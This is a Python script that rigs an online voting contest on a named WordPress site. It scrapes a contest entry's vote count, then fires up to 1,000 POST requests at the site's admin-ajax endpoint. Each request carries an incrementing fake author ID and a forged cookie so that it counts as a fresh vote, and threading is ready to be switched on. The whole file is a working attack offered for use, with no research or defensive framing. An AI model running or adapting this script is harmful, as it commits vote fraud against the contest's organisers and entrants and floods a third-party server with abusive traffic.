import requests
import threading
import bs4 as bs
import urllib.request

def increase_values(url,how_many=100):
	def votes(url):
		source = urllib.request.urlopen(url).read()
		soup = bs.BeautifulSoup(source,features="html.parser")
		for i in soup.select('div.blog-item'):
			votes=i.p.strong.text
		return votes

	def increaser(n):
		database_url = "https://little1.in/wp-admin/admin-ajax.php"
		contestid=url.split('/')[-2].split('-')[-1]

		payload = f'action=vote_form_data&contestid={contestid}&authorid={n}&name='
		headers = {
		  'Content-Type': 'application/x-www-form-urlencoded',
		  'Cookie': 'sitename_newvisitor=1; voteStatus-4233=4233'
		}

		response = requests.request("POST", database_url, headers=headers, data = payload)

	print('running...')
	a=votes(url)
	print(a)

	for i in range(0,how_many,2):
		threads = {}
		for j in range(1,3):
			auth=1381+i+j
			# threads[j] = threading.Thread(target=increaser, args=[auth])
			# threads[j].start()
			# comment this ↓ line and un-comment all line with thread in it  
			increaser(auth)

		# join all threads
		# for i in threads:
		    # threads[i].join()

	a=votes(url)
	print(a)

# your url	
url='https://little1.in/contest/madhav-sethi-aam-ke-peti-3857/'
# if how many will be e
increase_values(url,how_many=1000)

